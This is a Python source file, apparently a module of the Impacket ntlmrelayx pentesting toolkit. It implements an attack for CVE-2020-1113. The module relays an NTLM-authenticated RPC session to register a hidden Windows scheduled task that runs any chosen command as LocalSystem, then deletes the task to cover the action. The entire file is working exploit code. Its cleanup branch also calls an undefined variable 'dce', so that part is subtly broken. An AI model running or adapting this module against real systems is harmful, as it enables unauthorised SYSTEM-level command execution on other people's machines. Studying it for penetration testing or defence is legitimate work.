# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# RPC Attack Class
#
# Authors:
#  Alberto Solino (@agsolino)
#  Sylvain Heiniger (@sploutchy) / Compass Security (https://www.compass-security.com)
#
import cgi
import random
import string
import time

from impacket import LOG
from impacket.dcerpc.v5 import tsch
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack

PROTOCOL_ATTACK_CLASS = "RPCAttack"

# Attack for CVE-2020-1113
class RPCAttack(ProtocolAttack):
    """
    This is the RPC default attack class.
    It will execute a command
    """
    PLUGIN_NAMES = ["RPC"]

    def __init__(self, config, RPCClient, username):
        """
        :param config: NTLMRelayxConfig
        :param RPCClient: DCERPC Transport
        :param username: Username of the current session
        """
        ProtocolAttack.__init__(self, config, RPCClient, username)

    def run(self):
        try:
            if self.config.command is not None:
                LOG.info("Trying to execute specified command (%s)", self.config.command)

                tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
                tmpFileName = tmpName + '.tmp'

                xml = """<?xml version="1.0" encoding="UTF-16"?><Task version="1.2"
                xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><CalendarTrigger
                ><StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary><Enabled>true</Enabled><ScheduleByDay
                ><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger></Triggers><Principals><Principal
                id="LocalSystem"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal
                ></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy
                ><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false
                </StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><RunOnlyIfNetworkAvailable
                >false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle
                >false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true
                </Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun
                ><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority></Settings><Actions
                Context="LocalSystem"><Exec><Command>cmd.exe</Command><Arguments>/C %s &gt; %%windir%%\\Temp\\%s
                2&gt;&amp;1</Arguments></Exec></Actions></Task>""" % (cgi.escape(self.config.command), tmpFileName)
                taskCreated = False
                try:
                    LOG.info('Creating task \\%s' % tmpName)
                    self.client.set_call_id(2)
                    tsch.hSchRpcRegisterTask(self.client, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL,
                                             tsch.TASK_LOGON_NONE)
                    taskCreated = True

                    LOG.info('Running task \\%s' % tmpName)
                    tsch.hSchRpcRun(self.client, '\\%s' % tmpName)

                    done = False
                    while not done:
                        LOG.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
                        resp = tsch.hSchRpcGetLastRunInfo(self.client, '\\%s' % tmpName)
                        if resp['pLastRuntime']['wYear'] != 0:
                            done = True
                        else:
                            time.sleep(2)

                    LOG.info('Deleting task \\%s' % tmpName)
                    tsch.hSchRpcDelete(self.client, '\\%s' % tmpName)
                    taskCreated = False
                except Exception as e:
                    LOG.error('Task creation or execution failed with error: %s' % e)
                finally:
                    if taskCreated is True:
                        tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

            else:
                LOG.error("No default command configured, try with -c [command]")
        except Exception as e:
            LOG.error(str(e))
